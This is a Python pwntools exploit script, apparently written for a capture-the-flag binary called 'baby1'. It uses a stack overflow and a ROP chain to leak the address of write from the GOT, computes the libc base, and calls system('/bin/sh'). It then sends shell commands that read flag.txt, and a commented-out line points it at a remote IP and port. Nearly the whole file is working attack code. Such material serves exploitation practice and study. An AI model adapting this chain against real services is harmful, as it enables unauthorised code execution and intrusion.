# /usr/bin/python
#### exploit by p4w ####

from pwn import *
import time

off = 56
pop_rdi = 0x00000000004006c3 # pop rdi ; ret
pop_rsi = 0x00000000004006c1 # pop rsi ; pop r15 ; ret
pop_rbx = 0x00000000004006ba # pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
mov_rdx = 0x00000000004006a0 # mov rdx, r13 ; mov rsi, r14 ; mov edi, r15d ; call qword ptr [r12 + rbx*8]
main = 0x00000000004005f6

write_plt = 0x4004b0
write_got = 0x601018
LOCAL = True
if LOCAL == False:
    system_off = 0x045390
    bin_sh_off = 0x18cd57
    write_off = 0x0f72b0
else:
    system_off = 0x0004f440
    bin_sh_off = 0x001b3e9a
    write_off = 0x00110140

r = process("./baby1")#remote("51.254.114.246", 1111) #
r.recv(1024)
#gdb.attach(r,"""b *0x00000000004006b6
#c""")
p = ''
p += "A"*off
p += p64(pop_rbx)
p += p64(0x0)
p += p64(0x1)       #rbp must set to 1 to exit from the loop(take a look at the gadget mov_rdx)
p += p64(write_got) #r12
p += p64(0x8)       #r13
p += p64(write_got) #r14
p += p64(0x1)

p += p64(pop_rdi)
p += p64(0x1)           #stdout into rdi
p += p64(pop_rsi)
p += p64(write_got)     #address to leak into rsi
p += p64(0x1)           #stdout into rdi
p += p64(mov_rdx)       #will call *write_got to leak
p += p64(0xdeadb33f)
p += p64(0xdeadb33f)
p += p64(0xdeadb33f)
p += p64(0xdeadb33f)
p += p64(0xdeadb33f)
p += p64(0xdeadb33f)
p += p64(0xdeadb33f)
p += p64(main)          #restart execution
r.sendline(p)
time.sleep(0.2)
leak = u64(r.recv(8))
log.info("leaked write: " + hex(leak))
log.info("libc_base at: " + hex(leak-write_off))
libc_base = leak -write_off
p = ''
p += "A"*off
p += p64(pop_rdi)
p += p64(libc_base + bin_sh_off)
p += p64(libc_base + system_off)
r.sendline(p)
time.sleep(0.1)
r.sendline("id;ls -al;cat flag.txt")
r.interactive()
